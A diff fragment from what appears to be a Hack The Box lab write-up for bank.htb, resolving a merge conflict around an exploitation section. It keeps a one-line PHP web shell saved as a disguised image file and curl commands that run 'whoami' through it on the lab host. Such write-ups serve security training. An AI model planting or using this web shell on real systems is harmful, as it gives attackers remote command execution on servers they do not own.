@@ -654,7 +654,6 @@ It's a series of actions against the target URL `http://bank.htb/balance-transfe
 
 It demonstrates a systematic approach to exploring and interacting with a web application, including enumeration of files, extraction of sensitive information, and identification of potential vulnerabilities for further exploitation.
 
-<<<<<<< HEAD
 ```bash
 # or you can simply create the implant.png.htb with the following php code 
 <?php system($_REQUEST["cmd"]); ?>
@@ -666,6 +665,5 @@ www-data
 $ curl http://bank.htb/uploads/implant.png.htb --data-urlencode 'cmd=whoami'
 www-data
 ```
-=======
->>>>>>> origin/master
+
 ## Exploits
